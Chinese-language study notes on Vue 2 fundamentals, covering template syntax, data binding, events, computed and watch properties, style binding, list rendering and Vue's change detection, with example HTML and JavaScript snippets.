#  Vue简介

## Vue的特点

- 采用**组件化**模式，提高代码复用率，且让代码更好维护

  ![image-20210716094215363](Vue.assets/20210716094216.png)

- **声明式**编码，让编码人员无需直接操作DOM，提高开发效率

  ![image-20210716094437585](https://gitee.com/Cezzz/image2_repo/raw/master/img/20210716094438.png)

- 使用**虚拟DOM**+优秀的**Diff算法**，尽量复用DOM节点

  ![image-20210716094701431](Vue.assets/20210716094702.png)

  	![image-20210716094920922](https://gitee.com/Cezzz/image2_repo/raw/master/img/20210717010340.png)



# 搭建Vue开发环境

## 直接用script引入

- CDN

```html
<script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
```



- 最好使用Vue Devtools





# Vue核心

## Hello

- 想让Vue工作，就必须创建一个Vue实例，且要传入一个**配置对象**
- root容器里的代码依然符合HTML规范，只不过混入了一些特殊的Vue语法
- root容器里的代码被称为**Vue模板**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id ="root">
        <h1>hello,{{name}}</h1>
    </div>

    <script>
        //创建Vue实例,得到 ViewModel   
        new Vue({
            el: '#root', //el用于指定当前Vue实例为哪个容器服务，值通常为CSS选择器字符串
            data: { //data中用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
                name:'cez'
            },
            methods: {}
        });
    </script>
</body>

</html>
```



## 分析Hello案例

- Vue实例和模板是**一一对应**的关系，以下两段代码中，均无法正常解析渲染

```html
<div class="root">
        <h1>hello,{{name}}</h1>
</div>

<div class="root">
    <h1>hello,{{name}}</h1>
</div>

<script>
    new Vue({
        el: '.root',
        data: { 
            name:'cez'
        },
        methods: {}
    });
</script>
```

```html
<div id="root">
        <h1>hello,{{name}},{{address}}</h1>
</div>

<script>
    new Vue({
        el: '#root',
        data: { 
            name:'cez'
        },
        methods: {}
    })
    new Vue({
        el: '#root',
        data: { 
            address:'山东'
        },
        methods: {}
    });
</script>
```

​	

- 注意区分JS表达式和JS代码(语句)：
  - 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方   
  - js代码(语句)：`if(){}    for(){}等等`  



- 真实开发中只有一个Vue实例，并且会配合组件一起使用
- {{xxx}}中的xxx需要写js表达式，且xxx可以自动读取到data中的所有属性
- **一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新。**





## 模板语法

- Vue模板语法有两大类：

  - 插值语法：

    - 功能：用于解析标签体内容
    - 写法：{{xxx}},xxx是js表达式，且可以直接读取到data中的所有属性

  - 指令语法：

    - 功能：用于解析标签(包括：标签属性、标签体内容、绑定事件...)

    - 举例：v-bind:href="xxx"或省略v-bind，xxx同样要写js表达式，且可以直接读取data中的所有属性

      > Vue中有很多的指令，且形式都是：v-????，此处只是拿v-bind举例子

```html
<div id ="app">
        <h1>插值语法</h1>
        <h1>{{name}}</h1>
        <hr/>
        <h1>指令语法</h1>
        <a v-bind:href="url">cez网站</a>
        <a :href="url">cez网站2</a>
    </div>

<script>
    //创建Vue实例,得到 ViewModel
    var vm = new Vue({
        el: '#app',
        data: {
            name:'cez',
            url:"http://www.cezzz.top"
        },
        methods: {}
    });
</script>
```





## 数据绑定

- Vue有两种数据绑定的方式：

  1. 单向绑定(v-bind)：数据只能从data流向页面

  2. 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data  

     > 1. 双向绑定一般都应用在表单类元素上(如:input，select等)
     > 2. v-model:value 可以简写为v-model,因为v-model默认收集的就是value值

- `v-model`只能用在表单类元素(输入类元素)上   

```html
<div id ="app">
        单向数据绑定:<input type="text" v-bind:value="msg">
        双向数据绑定:<input type="text" v-model:value="msg">
    	双向数据绑定:<input type="text" v-model="msg">
</div>

<script>
    //创建Vue实例,得到 ViewModel
    var vm = new Vue({
        el: '#app',
        data: {
            msg:"cez"
        },
        methods: {}
    });
</script>
```





## el与data的两种写法

- el两种写法：
  - new Vue的时候配置el属性
  - 先创建Vue实例，随后通过.$mount()挂载

```html
<div id ="app">
    {{name}}
</div>

<script>
    //el的两种写法
    const vm = new Vue({
        //el: '#app',   第一种写法
        data: {
            name:'cez'
        },
        methods: {}
    });
    vm.$mount("#app");  //第二种写法 
</script>
```

- data两种写法：

  - 对象式

  - 函数式(写组件时必须用函数式)

    >  由Vue管理的函数，一定不要写箭头函数，一旦写箭头函数，this就不再是Vue实例了

```html
<div id ="app">
    {{name}}
</div>

<script>
    const vm = new Vue({
        el:"#app",
        //第一种写法
        // data: {
        //     name:'cez'
        // },

        //第二种写法
        data:function(){
            console.log(this)//此处的this是Vue实例对象
            return {
                name:'cez'
            }
        },
        methods: {}
    });
</script>
```



## 理解MVVM模型

- MVVM:Model-View-ViewModel 是一种软件架构模式

  - M：Model   对应data中的数据
  - V： 视图(View)   模板
  - VM：视图模式(ViewModel)    Vue实例对象

  

  

- data中所有的属性，最后都出现在了vm身上

- vm身上所有的属性，及Vue原型上所有属性，在Vue模板中都可以直接使用 如`{{$options}}  {{$emit}}`均有结果出现。

  

  

  ![image-20210717001124214](Vue.assets/20210717001125.png)

  ![image-20210717001930625](Vue.assets/20210717001932.png)





## Object.defineProperty

```html
<script>    let number = 18;     let person = {        name:'cez',        sex:"男",    };    Object.defineProperty(person,'age',{        // value:20,        // enumerable:true,  //控制属性是否可以枚举，默认为false        // writable:true,     //控制属性是否可以修改，默认为false        // configurable:true, //控制属性是否可以删除，默认为false        //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值        get:function(){            console.log("读取age属性")            return number;        },        //当有人修改person的age属性时，set函数(setter)就会被调用，且返回值就是修改的具体值        set:function(value){            console.log("修改了age属性,且值为",value)            number = value        }    });    console.log(person.value);</script>
```



## 数据代理

- 数据代理：通过一个对象代理另一个对象中属性的操作(读/写)

```html
<script>
    let obj = {x:100}
    let obj2 = {y:200}

    Object.defineProperty(obj2,'x',{
        get(){
            return obj.x;
        },

        set(value){
            obj.x = value
        }
    })
</script>
```

![image-20210717004356005](Vue.assets/20210717004356.png)





## Vue中的数据代理

- Vue通过vm对象来代理data对象中属性的操作(读写)

- Vue中数据代理的好处：更方便地操作data中的数据

- 基本原理：通过`Object.defineProperty()`把data对象中所有属性添加到vm上，为每一个添加到vm上的属性都指定一个getter/setter，在getter/setter内部去操作data中的属性

  > 在_data属性中做了数据劫持，这是为了能够做到响应式

![image-20210717004713044](Vue.assets/20210717004714.png)

![image-20210717005720993](Vue.assets/20210717005722.png)





## 事件处理

1. 使用`v-on:xxx`或`@xxx`绑定事件，其中xxx是事件名
2. 事件的回调需要配置在methods对象中，最终会在vm上
3. methods中配置的函数，不要用箭头函数！否则this就不是vm了
4. methods中配置的函数都是被Vue管理的函数，this指向的是vm或组件实例对象
5. `@click="demo"`和`@click="demo($event)"`效果一样，但后者可以传参

```html
<div id ="app">    <h2>Hello,{{name}}</h2>    <button v-on:click="showInfo1">点我提示信息1(不传参)</button>    <!-- 如果传参时想要不丢失event，则使用$event传参即可 -->    <button @click="showInfo2(66,$event)">点我提示信息2(传参)</button></div><script>    var vm = new Vue({        el: '#app',        data: {            name:'cez'          },        methods: {            showInfo1(event){                //console.log(event.target.innerText)                //console.log(this===vm)  true 此处的this就是Vue实例                alert("lxy1");            },            showInfo2(number,a,b,c){                console.log(number,a,b,c);            }        },    });</script>
```





## 事件修饰符

1. prevent：阻止默认事件(常用)

2. stop：阻止事件冒泡(常用)

   > 事件冒泡 ：当一个元素接收到事件的时候 会把他接收到的事件传给自己的父级，一直到window (注意这里传递的仅仅是事件 并不传递所绑定的事件函数。所以如果父级没有绑定事件函数，就算传递了事件 也不会有什么表现 但事件确实传递了。)

3. once：只触发一次(常用)

4. capture：使用事件的捕获模式(事件在捕获时就进行处理，而不是在冒泡时)

   点击div2处，如果不用捕获模式，则先捕获div1，再捕获div2，然后从div2开始冒泡处理事件，所以依次输出2，1 

   ![image-20210717082030517](Vue.assets/20210717082031.png)

5. self：只有event.target是当前操作的元素时才触发事件

6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕

```html
<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Document</title>    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>    <style>        *{            margin-top: 20px;        }        #demo01{            height: 50px;            background-color: seagreen;        }        #box1{            background-color: skyblue;            padding:5px;        }        #box2{            background-color: orange;            padding:5px;        }        .list{            height:200px;                   width:200px;            background-color:orange;            overflow: auto;        }        li{            height:100px;        }    </style></head><body>    <div id ="app">        <!-- 阻止默认事件 -->        <a href="http://www.cezzz.top" @click.prevent="showInfo">点我提示信息</a>        <!-- 阻止事件冒泡 -->        <div id="demo01" @click.prevent="showInfo">            <a href="http://www.cezzz.top" @click.stop="showInfo">点我提示信息</a>        </div>        <!-- 事件只触发一次 -->        <button @click.once="showInfo">点我提示信息</button>                <!-- 使用事件捕获模式 -->        <div id="box1" @click.capture="showMsg(1)">            div1            <div id="box2" @click="showMsg(2)">div2</div>        </div>        <!-- self:只有event.target是当前操作的元素时才触发事件 -->        <div @click.self="showInfo">            <!-- 点击button时event.target就是这个button，所以div中的showInfo不会触发 -->            <button @click="showInfo">点我提示信息</button>        </div>        <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 -->        <ul @wheel.passive="demo" class="list">            <li>1</li>            <li>2</li>            <li>3</li>            <li>4</li>        </ul>    </div>    <script>        var vm = new Vue({            el: '#app',            data: {                            },            methods: {                showInfo(){                    alert("wuhu!");                },                showMsg(msg){                    console.log(msg);                },                demo(){                    for (let i=0;i<10000;i++){                        console.log('#');                    }                    console.log('end.');                }            },        });    </script></body></html>
```





## 键盘事件

- Vue中常用的按键别名：
  - 回车：enter
  - 删除：delete(捕获删除键和退格键)
  - 退出：esc
  - 空格：space
  - 换行：tab(最好用keydown，因为keyup前已经切换焦点了)
  - 上：up
  - 下：down
  - 左：left
  - 右：right
    - Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-base(短横线命名)

![image-20210717084012579](Vue.assets/20210717084014.png)

​	

- 系统修饰键(用法特殊):ctrl、alt、shift、meta
  - 配合keyup使用：按下修饰键的同时再按下其他键，随后释放其他键，事件才被触发
  - 配合keydown使用：正常触发事件
- 也可以使用keyCode去指定具体的按键(不推荐,已废弃)
- Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名



```html
<div id ="app">        <input type="text" placeholder="按下回车提示输入" @keyup="showInfo"/>    <!-- 绑定CapsLock要符合短横线命名 -->    <input type="text" placeholder="按下CapsLock提示输入" @keyup.caps-lock="showInfo"/></div><script>    Vue.config.keyCodes.huiche=13; //不推荐使用    var vm = new Vue({        el: '#app',        data: {        },        methods: {            showInfo(e){                console.log(e.key,e.keyCode);                console.log(e.target.value);            }        },    });</script>
```



> 事件的修饰符可以连写  如`@click.stop.prevent` 





## 计算属性-姓名案例

![image-20210717153820903](Vue.assets/20210717153822.png)

- 插值语法实现

  ```html
  <div id ="app">    姓<input type="text" v-model="firstName"/> <br/>    名<input type="text" v-model="lastName"/> <br/>    姓名:<span>{{firstName.slice(0,3)}}-{{lastName}}</span></div><script>    var vm = new Vue({        el: '#app',        data: {            firstName:'c',            lastName:'ez'        },        methods: {        },    });</script>
  ```

  

- methods实现

  > 只要data中的数据发生改变，那么Vue一定会重新解析模板
  >
  > 本例中只要data发生改变，fullName就会被调用

  ```html
  <div id ="app">    姓<input type="text" v-model="firstName"/> <br/>    名<input type="text" v-model="lastName"/> <br/>    姓名:<span>{{fullName()}}</span>    姓名:<span>{{fullName()}}</span> <br/>    姓名:<span>{{fullName()}}</span> <br/>    姓名:<span>{{fullName()}}</span> <br/></div><script>    var vm = new Vue({        el: '#app',        data: {            firstName:'c',            lastName:'ez'        },        methods: {            fullName(){                console.log('方法被调用');                return this.firstName+'-'+this.lastName;            }        },    });</script>
  ```



## 计算属性

- 定义：要用的属性不存在，要通过**已有的属性**计算得来
- 原理：底层借助了`Object.defineproperty`方法提供的getter和setter 
- 优势： 与methods实现相比，内部有缓存机制(复用)，效率更高，调式方便
- 备注：
  - 计算属性最终会出现在vm上，直接读取使用即可
  - 如果计算属性要被修改，必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

> 计算属性不在vm._data中

```html
<div id ="app">
    姓<input type="text" v-model="firstName"/> <br/>
    名<input type="text" v-model="lastName"/> <br/>
    姓名:<span>{{fullName}}</span> <br/>
    姓名:<span>{{fullName}}</span> <br/>
    姓名:<span>{{fullName}}</span> <br/>
    姓名:<span>{{fullName}}</span> <br/>

</div>

<script>
    const vm = new Vue({
        el: '#app',
        data: {
            firstName:'c',
            lastName:'ez'
        },
        computed:{
            fullName:{
                //get的作用:当有人读取fullName时,get会被调用,且返回值就作为fullName的值
                //get中的this指向调整为vm对象
                //get什么时候会被调用:1.初次读取fullName时 2.所依赖的数据发生变化时
                get(){
                    console.log('get被调用');
                    return this.firstName+'-'+this.lastName;
                },
                //当fullName被修改时调用set方法
                set(value){
                    console.log('set'+value);
                    const arr = value.split('-');
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                }
            }
        }
    });
</script>
```



## 计算属性简写

只使用读取，不考虑修改时才可这样使用

```html
<div id ="app">
    姓<input type="text" v-model="firstName"/> <br/>
    名<input type="text" v-model="lastName"/> <br/>
    姓名:<span>{{fullName}}</span> <br/>

</div>

<script>
    const vm = new Vue({
        el: '#app',
        data: {
            firstName:'c',
            lastName:'ez'
        },
        computed:{
            fullName(){
                console.log('get被调用');
                return this.firstName+'-'+this.lastName;
            }
        }
    });
</script>
```





## 监听属性-天气案例

```html
<div id ="app">     <h2>今天天气很{{info}}</h2>    <button @click="changeWeather">切换天气</button>    <!-- <button @click="isHot=!isHot">切换天气</button> --></div><script>    var vm = new Vue({        el: '#app',        data: {            isHot:true        },        methods: {            changeWeather(){                this.isHot = !this.isHot            }        },        computed: {            info(){                return this.isHot?'炎热':'凉爽';            }        },    });</script>
```





## 监视属性

- 监视属性watch：
  - 当被监视的属性变化时，回调函数自动调用，进行相关操作
  - 监视的属性必须存在，才能进行监视
  - 监视的两种写法
    - new Vue时传入watch配置
    - 通过vm.$watch监视

```html
<div id ="app">     <h2>今天天气很{{info}}</h2>    <button @click="isHot=!isHot">切换天气</button></div><script>    var vm = new Vue({        el: '#app',        data: {            isHot:true        },        computed: {            info(){                return this.isHot?'炎热':'凉爽';            }        },        watch: {            //方式一            isHot:{                //初始化时让handler调用以下                immediate:true,                //当isHot发生改变时调用handler方法                handler(newValue,oldValue){                    console.log("new:"+newValue+'----'+"old:"+oldValue)                }            },            //计算属性也可以被监视            info:{                //初始化时让handler调用以下                immediate:true,                //当isHot发生改变时调用handler方法                handler(newValue,oldValue){                    console.log("new:"+newValue+'----'+"old:"+oldValue)                }            }        },      });	    //方式二    vm.$watch('isHot',{        //初始化时让handler调用以下        immediate:true,        //当isHot发生改变时调用handler方法        handler(newValue,oldValue){            console.log("new:"+newValue+'----'+"old:"+oldValue)        }    })</script>
```





## 深度监视

- Vue中的watch默认不监测对象内部值的改变(一层)
- 配置deep:true可以监测对象内部值的改变(多层)   
  - 如果不配置deep:true，遇到对象时，虽然内部值变化了，但是外部对象的地址并没有发生变化，所以不会触发handler
- Vue自身可以监测对象内部值的改变，但Vue提供的watch不可以
- 使用watch时根据数据的具体结构，决定是否采用深度监视

```html
<div id ="app">     <h3>a的值是:{{numbers.a}}</h3>    <button @click="numbers.a++">点我让a+1</button>    <hr/>    <h3>b的值是:{{numbers.b}}</h3>    <button @click="numbers.b++">点我让a+1</button></div><script>    var vm = new Vue({        el: '#app',        data: {            numbers:{                a:1,                b:1            }        },        watch: {            //监视多级结构中某个属性的变化            'numbers.a':{                handler(){                    console.log('a改变了')                }            },            //监视多级结构中所有属性的变化            numbers:{                deep:true,                immediate:true,                handler(newValue,oldValue){                    console.log("new:"+newValue+'----'+"old:"+oldValue)                }            }        },      });</script>
```



## 监视的简写形式

- 当只需要handler，而不配置immediate和deep时，可以使用简写

```html
watch: {	//简写	isHot(newValue,oldValue){		console.log("new:"+newValue+'----'+"old:"+oldValue)	}}
```

```html
//简写  第二个参数不需要传配置对象，只需要传一个函数(注意不要用箭头函数)，该函数就相当于handlervm.$watch('isHot',function(newValue,oldValue){   console.log("new:"+newValue+'----'+"old:"+oldValue);})
```





## watch对比computed

- computed和watch之间的区别：
  - computed能完成的功能，watch都可以完成
  - watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作
- 两个重要的小原则：
  - 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或组件实例对象
  - 所有不被Vue所管理的函数(定时器的回调函数，ajax的回调函数，Promise的回调函数等)，最好写成箭头函数，这样this的指向才是vm或组件实例对象(箭头函数没有this，需要向上找，这样就会找到vm或组件实例对象了，如果写普通函数，则它的this就是window了)

用watch写姓名案例

```html
<div id ="app">    姓<input type="text" v-model="firstName"/> <br/>    名<input type="text" v-model="lastName"/> <br/>    姓名:<span>{{fullName}}</span> <br/></div><script>    const vm = new Vue({        el: '#app',        data: {            firstName:'c',            lastName:'ez',            fullName:'c-ez'        },        watch:{            firstName(val){                //watch可以开启异步任务，一秒钟后更改全名                setTimeout(()=>{                    this.fullName = val + '-' + this.lastName;                },1000);            },            lastName(val){                this.fullName = this.firstName + '-' + val;            }        }    });</script>
```





## 绑定class样式



```html
<div id ="app">    <!-- 绑定class样式 字符串写法，适用于：样式的类名不确定，需要动态指定 -->    <div class="basic" :class="mood" @click="changeMood">{{name}}</div>    <hr/>    <!-- 绑定class样式 数组写法，适用于：要绑定样式的个数和名字均不确定 -->    <div class="basic" :class="classArr">{{name}}</div>    <hr/>    <!-- 绑定class样式 对象写法，适用于：要绑定样式的个数和名字均确定,但是要动态决定是否使用 -->    <div class="basic" :class="classObj">{{name}}</div></div><script>    var vm = new Vue({        el: '#app',        data: {            name:'cez',            mood:'normal',            classArr:['lxy1','lxy2','lxy3'],            classObj:{                lxz1:false,                lxz2:true            }        },        methods: {            changeMood(){                const arr = ['happy','sad','normal']                const index = Math.floor(Math.random()*3)  //Math.floor向下取整                this.mood = arr[index];            }        },    });</script>
```



![image-20210717211503037](Vue.assets/20210717211504.png)





## 绑定style样式

- style样式：
  - `:style="{fontSize:xxx}"`，其中xxx是动态值
  - `:style="{a,b}"`，其中a,b是样式对象



```html
<div id ="app">    <div class="basic" :style="{fontSize:fsize+'px'}">{{name}}</div>    <hr/>    <div class="basic" :style="styleObj">{{name}}</div>    <hr/>    <!-- 数组写法 -->    <div class="basic" :style="[styleObj,styleObj2]">{{name}}</div>    <hr/>    <!-- 数组写法 -->    <div class="basic" :style="styleArr">{{name}}</div></div><script>    var vm = new Vue({        el: '#app',        data: {            name:'cez',            fsize:40,            styleObj:{                fontSize:'60px',                backgroundColor:'green'            },            styleObj2:{                height:'50px'            },            styleArr:[                {                    fontSize:'60px',                    backgroundColor:'green'                },                {                    height:'50px'                }            ]        },    });</script>
```



## 条件渲染

- `v-if`
  - `v-if="表达式"`
  - `v-else-if="表达式"`
  - `v-else="表达式"` 
  - 适用于切换频率较低的场景
  - 特点：不展示的DOM元素直接被移除
  - 注意：`v-if和v-else-if、v-else`一起使用，但要求结构不能被打断



- `v-show`
  - `v-show="表达式"`
  - 适用于切换频率较高的场景
    - 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉(`display:none`)



```html
<div id ="app">    <h2>当前的n值为{{n}}</h2>    <button @click="n++">点我n+1</button>    <!-- 使用v-show条件渲染 -->    <h2 v-show="false">hello1,{{name}}</h2>    <h2 v-show="1===1">hello2,{{name}}</h2>    <!-- 使用v-if条件渲染 -->    <h2 v-if="false">hello1,{{name}}</h2>    <h2 v-if="1===1">hello2,{{name}}</h2>    <!-- v-else和v-else-if和v-else,中间不可以中断 -->    <div v-if="n===1">Angular</div>    <div v-else-if="n===2">React</div>    <!-- 中断 -->    <!-- <div>中断</div> -->    <div v-else-if="n===3">Vue</div>    <div v-else>Other...</div>    <!-- v-if与template的配合使用 template不会破坏结构 -->    <template v-if="n===1">        <h2>hello</h2>        <h2>lxy</h2>        <h2>js</h2>    </template></div><script>    var vm = new Vue({        el: '#app',        data: {            name:'cez',            n:0        }    });</script>
```

![image-20210717224325341](Vue.assets/20210717224326.png)





## 列表渲染

`v-for指令`

- 用于展示列表数据
- 语法：`v-for="(item,index) in xxx" :key="yyy"`
- 可遍历：数组、对象、字符串(很少)、指定次数(很少)



```html
<div id ="app">    <!-- 遍历数组 -->    <h2>人员列表</h2>    <ul>        <li v-for="p in persons" :key="p.id">{{p.name}}--{{p.age}}</li>    </ul>    <ul>        <li v-for="(p,index) in persons" :key="index">{{index}}--{{p.name}}--{{p.age}}</li>    </ul>    <!-- 遍历对象 -->    <h2>汽车信息</h2>    <ul>        <li v-for="(value,key) in car" :key="key">{{key}}--{{value}}</li>    </ul>    <!-- 遍历字符串 -->    <h2>字符串</h2>    <ul>        <li v-for="(c,k) in str" :key="k">{{c}}--{{k}}</li>    </ul>    <hr/>    <!-- 遍历指定次数 -->    <ul>        <li v-for="(a,b) in 5">{{a}}--{{b}}</li>    </ul></div><script>    var vm = new Vue({        el: '#app',        data: {            persons:[                {                    id:'001',                    name:'张三',                    age:18                },                {                    id:'002',                    name:'李四',                    age:19                },                {                    id:'003',                    name:'王五',                    age:20                },            ],            car:{                name:'奥迪A8',                price:'70W',                color:'black'            },            str:'test'        },        methods: {        },    });</script>
```





## key作用和原理

![image-20210717233819817](Vue.assets/20210717233820.png)

![image-20210717234108316](Vue.assets/20210717234109.png)

![image-20210717234346349](Vue.assets/20210717234347.png)





## 列表过滤



- 用watch实现

  ```html
  <div id ="app">    <!-- 遍历数组 -->    <h2>人员列表</h2>    <input type="text" v-model="keyWord" placeholder="请输入姓名"/>    <ul>        <li v-for="p in filPersons" :key="p.id">{{p.name}}--{{p.age}}--{{p.sex}}</li>    </ul></div><script>    var vm = new Vue({        el: '#app',        data: {            keyWord:'',            persons:[                {id:'001',name:'马冬梅',age:18,sex:'女'},                {id:'002',name:'周冬雨',age:19,sex:'女'},                {id:'003',name:'周杰伦',age:20,sex:'男'},                {id:'004',name:'温兆伦',age:20,sex:'男'},            ],            filPersons:[]        },        watch:{            keyWord:{                immediate:true,                handler(val){                    //filter会返回一个全新的数组                    //任意一个字符串.indexOf('')结果都为0                    this.filPersons = this.persons.filter((p)=>{                         return p.name.indexOf(val)!==-1                    })                                 }            }        }    });</script>
  ```

- 用computed实现

  ```javascript
  computed:{    filPersons(){        return this.persons.filter((p)=>{            return p.name.indexOf(this.keyWord)!==-1;        })    }}
  ```

  



## 列表排序

- 先序知识：JavaScript  Array.sort()方法

  - 如果调用该方法时没有使用参数，将按字母顺序对数组中的元素进行排序，说得更精确点，是**按照字符编码**的顺序进行排序。要实现这一点，首先应把数组的元素都转换成字符串（如有必要），以便进行比较。

  - 如果想按照其他标准进行排序，就需要提供比较函数，该函数要比较两个值，**然后返回一个用于说明这两个值的相对顺序的数字**。比较函数应该具有两个参数 a 和 b，其返回值如下：

  - **若 a 小于 b，在排序后的数组中 a 应该出现在 b 之前，则返回一个小于 0 的值。**
  - 若 a 等于 b，则返回 0。
  - 若 a 大于 b，则返回一个大于 0 的值。

```html
<div id ="app">    <!-- 遍历数组 -->    <h2>人员列表</h2>    <input type="text" v-model="keyWord" placeholder="请输入姓名"/>    <button @click="sortType=2">年龄升序</button>    <button @click="sortType=1">年龄降序</button>    <button @click="sortType=0">原顺序</button>    <ul>        <li v-for="p in filPersons" :key="p.id">{{p.name}}--{{p.age}}--{{p.sex}}</li>    </ul></div><script>    var vm = new Vue({        el: '#app',        data: {            keyWord:'',            sortType:0,//0代表原数据，1代表降序  2代表升序            persons:[                {id:'001',name:'马冬梅',age:18,sex:'女'},                {id:'002',name:'周冬雨',age:30,sex:'女'},                {id:'003',name:'周杰伦',age:40,sex:'男'},                {id:'004',name:'温兆伦',age:25,sex:'男'},            ],        },        computed:{            filPersons(){                const arr = this.persons.filter((p)=>{                    return p.name.indexOf(this.keyWord)!==-1;                });                //判断是否需要排序                if (this.sortType){                    arr.sort((p1,p2)=>{                        return this.sortType===1?p2.age-p1.age:p1.age-p2.age;                    })                }                return arr;            }        }    });</script>
```





## 更新时的一个问题

![image-20210718094931281](Vue.assets/20210718095004.png)

![image-20210718094959540](Vue.assets/20210718095001.png)

```html
<div id ="app">        <!-- 遍历数组 -->    <h2>人员列表</h2>    <input type="text" v-model="keyWord" placeholder="请输入姓名"/>    <button @click="updateMei">更新马冬梅的信息</button>    <ul>        <li v-for="p in persons" :key="p.id">{{p.name}}--{{p.age}}--{{p.sex}}</li>    </ul></div><script>    var vm = new Vue({        el: '#app',        data: {            keyWord:'',            sortType:0,//0代表原数据，1代表降序  2代表升序            persons:[                {id:'001',name:'马冬梅',age:18,sex:'女'},                {id:'002',name:'周冬雨',age:30,sex:'女'},                {id:'003',name:'周杰伦',age:40,sex:'男'},                {id:'004',name:'温兆伦',age:25,sex:'男'},            ],        },        methods:{            updateMei(){                // this.persons[0].name="韩金轮"  //奏效                // this.persons[0].age=30  //奏效                this.persons[0] = {id:'001',name:'韩金轮',age:30,sex:'男'} //不奏效            }        }    });</script>
```





## Vue监测数据的原理_对象

- 模拟数据监测--setInterval()

  setInterval() 方法可按照指定的周期（以毫秒计）来调用函数或计算表达式。	

  setInterval() 方法会不停地调用函数，直到 [clearInterval()](https://www.runoob.com/jsref/met-win-clearinterval.html) 被调用或窗口被关闭。由 setInterval() 返回的 ID 值可用作 clearInterval() 方法的参数。

  ```javascript
  <script>
      let data = {
          name:'cez',
          address:'hitwh'
      }
  
      let tmp = 'cez'
      setInterval(() => {
          if (data.name!=tmp){
              tmp = data.name
              console.log('name被修改了');
          }
      }, 100);
  </script>
  ```

  > 这里如果不使用tmp变量而是在判断中直接写data.name!='cez'，则改变data.name，每隔100ms就会调用方法

- 模拟数据监测--`Object.defineProperty()`   不可行

  - 直接在data中defineProperty会造成get和set的无限递归调用自身。

    ![image-20210718100042415](Vue.assets/20210718100043.png)

  ```javascript
  <script>    let data = {        name:'cez',        address:'hitwh'    }    Object.defineProperty(data,'name',{        get(){            return data.name        },        set(val){            data.name = val        }    })</script>
  ```

  

- Observer

  这里仅仅模拟了一层，在Vue中更加完善，只要是对象，不管有几层都可以监视

```javascript
let data = {    name:'cez',    address:'hitwh'}   //创建一个监视的实例对象，用于监视data中属性的变化const obs = new Observer(data)console.log(obs)//准备一个vm实例对象let vm = {}vm._data = data = obsfunction Observer(obj){    //汇总对象中所有的属性形成一个数组    const keys = Object.keys(obj)    //遍历    keys.forEach((k)=>{        //这里的this就是Observer的实例对象        Object.defineProperty(this,k,{            get(){                return obj[k]            },            set(val){                console.log('${k}被修改了,我要去解析模板,生成虚拟DOM.....开始干活')                obj[k] = val            }        })    })    }
```



## Vue.set()

`[Vue.set( target, propertyName/index, value )]`

- **参数**：

  - `{Object | Array} target`
  - `{string | number} propertyName/index`
  - `{any} value`

- **返回值**：设置的值。

- **用法**：

  向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 `this.myObject.newProperty = 'hi'`)

  **注意对象不能是 Vue 实例，或者 Vue 实例的根数据对象。**

![image-20210718103753909](Vue.assets/20210718103755.png)

![image-20210718103811958](Vue.assets/20210718103813.png)

```html
<div id ="app">    <h2>学校名称:{{name}}</h2>    <h2>学校地址:{{address}}</h2>    <hr/>    <h1>学生信息</h1>    <button @click="addSex">添加性别属性,默认为男</button>    <h2>学生姓名:{{student.name}}</h2>    <h2>学生年龄:真实{{student.age.rAge}}--虚假{{student.age.sAge}}</h2>    <h2 v-if="student.sex">学生性别:{{student.sex}}</h2>    <hr/>    <h2>朋友</h2>    <ul>        <li v-for="(f,index) in student.friends" :key="index">{{f.name}}--{{f.age}}</li>    </ul></div><script>    const vm = new Vue({        el:'#app',        data:{            name:'hitwh',            address:'wh',            student:{                name:'cez',                age:{                    rAge:20,                    sAge:18                },                friends:[                    {name:'lxy',age:20},                    {name:'lxz',age:19}                ]            }        },        methods:{            addSex(){                //this.$set(this.student,'sex','男');                Vue.set(this.student,'sex','男');            }        }    })</script>
```







## Vue监测数据的原理_数组

- 前序知识:JavaScript splice()方法

  - 定义和用法

    splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。

    > 该方法会改变原始数组。

  ![image-20210718105601009](Vue.assets/20210718105603.png)





![image-20210718105930216](Vue.assets/20210718105931.png)





- vm将上面变更数组的7个方法进行了包裹

	![image-20210718110126403](Vue.assets/20210718110127.png)

```html
<div id ="app">    <h2>学校名称:{{name}}</h2>    <h2>学校地址:{{address}}</h2>    <hr/>    <h1>学生信息</h1>    <button @click="addSex">添加性别属性,默认为男</button>    <h2>学生姓名:{{student.name}}</h2>    <h2>学生年龄:真实{{student.age.rAge}}--虚假{{student.age.sAge}}</h2>    <h2 v-if="student.sex">学生性别:{{student.sex}}</h2>    <h2>爱好</h2>    <ul>        <li v-for="(hobby,index) in student.hobbies" :key="index">            {{hobby}}        </li>    </ul>    <hr/>    <h2>朋友</h2>    <ul>        <li v-for="(f,index) in student.friends" :key="index">{{f.name}}--{{f.age}}</li>    </ul></div><script>    var vm = new Vue({        el: '#app',        data: {            name:'hitwh',            address:'wh',            student:{                name:'cez',                age:{                    rAge:20,                    sAge:18                },                hobbies:['抽烟','喝酒','烫头'],                friends:[                    {name:'lxy',age:20},                    {name:'lxz',age:19}                ]            }        },        methods: {            addSex(){                //this.$set(this.student,'sex','男');                Vue.set(this.student,'sex','男');            }        },    });</script>
```





## Vue监测数据总结

1. Vue会监视data中所有层次的数据

2. 如何监测对象中的数据

